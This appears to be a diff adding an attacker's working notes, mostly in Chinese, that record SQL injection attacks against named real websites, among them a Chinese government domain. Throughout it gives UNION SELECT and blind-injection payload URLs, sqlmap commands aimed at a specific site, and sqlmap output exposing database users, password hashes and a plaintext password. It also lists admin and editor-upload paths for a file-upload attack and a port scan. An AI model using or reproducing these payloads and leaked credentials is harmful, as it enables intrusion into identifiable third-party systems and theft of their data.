@@ -1,0 +1,101 @@
+
+http://www.xiangs.org/uploadnews/145181172226602.php?id=150+UNION+ALL+SELECT+version(),database()
+
+
+http://www.hnjs.gov.cn/zjtWeb/ZJTSouSuo.aspx?canshu=sadf%22%20union%20select%201
+
+
+'D:\hongguang0000\data\w78#v7@#@#!262.mdb'。 
+
+http://www.xuanyuanjituan.com/admin/admin_sql.asp，行 11 
+
+admin\nowaasp.asp
+
+http://www.xuanyuanjituan.com/uploadfile/edit.asp
+
+http://www.xiangs.org/uploadnews/145181172226602.php?id=150%20un+ioN%20sEl+ect%201,database()--%20fs
+
+http://www.xuanyuanjituan.com/admin/w78eWebEditor/dialog/img.htm
+
+http://www.xuanyuanjituan.com/admin/w78eWebEditor/asp/upload.asp?action=save&type=image&style=popup&cusdir=edit.asp
+
+
+
+web server操作系统: Windows 2008 R2 or 7
+网站选用的WEB服务器类型和开发语言: ASP.NET, Microsoft IIS 7.5, ASP
+back-end DBMS: Microsoft SQL Server 2005
+
+可用数据库 [5]:
+[*] data_data_f
+[*] master
+[*] model
+[*] msdb
+[*] tempdb
+
+当前用户:    'sa'
+当前数据库:    'data_data_f'
+
+# 当前数据库 'gsbarcom'
+python sqlmap.py -u "http://www.g-s-bar.com/contact/index.php?id=1"  --batch --flush-session --current-db  
+
+# 当前用户
+python sqlmap.py -u "http://www.g-s-bar.com/contact/index.php?id=1"  --batch --flush-session --current-user
+
+后端DBMS是：MySQL
+网站选用的WEB服务器类型和开发语言: Apache, PHP 5.2.13
+
+后端数据库: MySQL 5
+
+当前用户:    'meodi743@localhost'
+python sqlmap.py -u "http://www.g-s-bar.com/contact/index.php?id=1"  --batch --random-agent --current-user --threads 3
+' or '1' = '1
+
+===============================================================
+# 当前数据库 'gsbarcom'
+
+当前用户:    'meodi743@localhost'
+
+数据库管理系统用户密码哈希:
+[*] apetaitocom [1]:
+    密码哈希: 28d7df9c263838af
+[*] jacktocolognenet [1]:
+    密码哈希: 1b58b2221f394531
+[*] meodi743 [1]:
+    密码哈希: 11d6c6e855039d0c
+[*] officedolcecom [1]:
+    密码哈希: 2ff2d1f542b263dd
+[*] puregoverncom [1]:
+    密码哈希: 60db597850b67f31
+[*] root [2]:
+    密码哈希: 11d6c6e855039d0c
+    密码哈希: NULL
+[*] shinshinannet [1]:
+    密码哈希: 329f701b4fe00c56
+[*] test [1]:
+    密码哈希: 6d244fde2ed52478
+    明文密码: testtest
+'(SELECT 'OeYc' FROM SYSIBM.SYSDUMMY1)='OeYc''
+
+    -u "http://www.g-s-bar.com/contact/index.php?id=1"  --batch --random-agent --flush-session
+
+  http://www.g-s-bar.com/contact/index.php?id=1  ' AND ORD(MID((IFNULL(CAST(VERSION() AS CHAR),0x20)),17,1))>1 AND 'Dipg'='Dipg
+
+
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+110/tcp  open  pop3
+143/tcp  open  imap
+443/tcp  open  https
+587/tcp  open  submission
+993/tcp  open  imaps
+995/tcp  open  pop3s
+5190/tcp open  aol
+5432/tcp open  postgresql
+9878/tcp open  unknown
+
+查字段数量
+http://www.g-s-bar.com/contact/index.php?id=1' order by 8-- -
+
+http://www.g-s-bar.com/contact/index.php?id=1' UNION+ALL+SELECT+1,2,3,4,5,6,7,8-- -
